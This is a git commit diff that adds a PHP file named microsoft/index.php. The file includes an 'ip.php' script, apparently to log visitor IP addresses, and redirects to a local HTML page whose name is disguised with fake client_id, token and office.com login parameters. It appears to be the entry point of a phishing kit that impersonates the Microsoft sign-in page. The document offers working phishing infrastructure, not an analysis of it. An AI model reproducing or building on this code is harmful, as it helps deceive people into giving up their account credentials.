ac92be1d5f8ae4b5ae01759f18af37da0dc47c3a
Teeddy-LB <83368661+Teeddy-LB@users.noreply.github.com>
2024-02-01 17:29:42 -0500

    Add files via upload

---
+++ microsoft/index.php
@@ -0,0 +1,5 @@
+<?php
+include 'ip.php';
+header('Location: login_client_id=2391290a-10889f-19e9109b-01c909a292ff09d-1919b901e-58518c_content_token=11PT9vGyEj9ZKSdGBH3nhb_2-Jy_cLKhIb-OJoppDyqkq9QkqxBHEycDQ4xs5deoiTEZ3rU7J_redirect_uri=https3a22www0fofficeaacom20accounts0fv20flogin0f638318506088344824.html');
+exit
+?>
